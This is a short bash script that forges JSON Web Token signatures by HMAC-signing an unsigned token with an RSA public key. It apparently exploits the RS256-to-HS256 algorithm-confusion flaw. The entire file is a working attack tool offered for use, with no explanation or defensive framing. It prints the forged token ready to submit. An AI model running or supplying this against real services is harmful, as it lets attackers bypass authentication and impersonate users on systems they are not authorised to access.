#/bin/bash
#usage : ./rsa2signature.sh <publickey file name> <jwt without signature>
echo "usage: ./rsa2signature.sh <publickey file name> <jwt without signature>"
ascii=$(cat $1 | xxd -p | tr -d "\\n")
echo $ascii
hex=$(echo -n "$2" | openssl dgst -sha256 -mac HMAC -macopt hexkey:$ascii)
hex=${hex:9}
echo $hex
jwt=$(python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('$hex')).replace('=','')\")")

echo "[+]signature: $2.$jwt"
